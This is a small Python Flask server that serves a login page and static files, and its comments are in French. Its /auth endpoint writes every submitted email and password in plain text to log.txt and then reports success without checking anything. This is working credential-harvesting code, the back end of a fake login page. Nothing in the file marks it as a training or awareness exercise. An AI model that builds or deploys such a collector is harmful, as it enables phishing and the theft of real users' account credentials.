from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from datetime import datetime

app = Flask(__name__, static_folder=".")
CORS(app)

# Page login
@app.route("/login.html")
def login():
    return send_from_directory(".", "login.html")

@app.route("/success.html")
def success():
    return send_from_directory(".", "success.html")


# Dossiers statiques
@app.route("/css/<path:filename>")
def css_files(filename):
    return send_from_directory("css", filename)

@app.route("/js/<path:filename>")
def js_files(filename):
    return send_from_directory("js", filename)

@app.route("/images/<path:filename>")
def images_files(filename):
    return send_from_directory("images", filename)

# API
@app.route("/auth", methods=["POST"])
def auth():
    data = request.get_json()

    email = data.get("email", "")
    password = data.get("password", "")

    with open("log.txt", "a", encoding="utf-8") as f:
        f.write(f"{datetime.now()} | {email} | {password}\n")

    return jsonify({"status": "ok"})


if __name__ == "__main__":
    app.run(port=5000, debug=True)
